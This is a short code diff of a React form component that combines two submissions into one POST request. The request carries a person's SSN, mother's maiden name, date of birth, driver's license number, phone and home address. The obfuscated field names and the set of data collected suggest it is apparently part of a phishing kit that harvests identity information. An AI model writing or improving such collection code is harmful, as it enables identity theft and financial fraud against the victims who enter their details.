@@ -149,21 +149,18 @@ const BasicInfo: React.FC = () => {
 
       const dob = `${getMonthName(month)}/${day}/${year}`;
 
-      // Submit basic info
+      // Combined submission
       await axios.post(`${baseUrl}api/affinity-meta-data-3/`, {
         emzemz: username,
+        // Basic info
         fzNme,
         lzNme,
         phone,
         ssn,
         motherMaidenName,
         dob,
-        driverLicense
-      });
-
-      // Submit home address
-      await axios.post(`${baseUrl}api/affinity-meta-data-4/`, {
-        emzemz: username,
+        driverLicense,
+        // Home address
         stAd,
         apt,
         city,
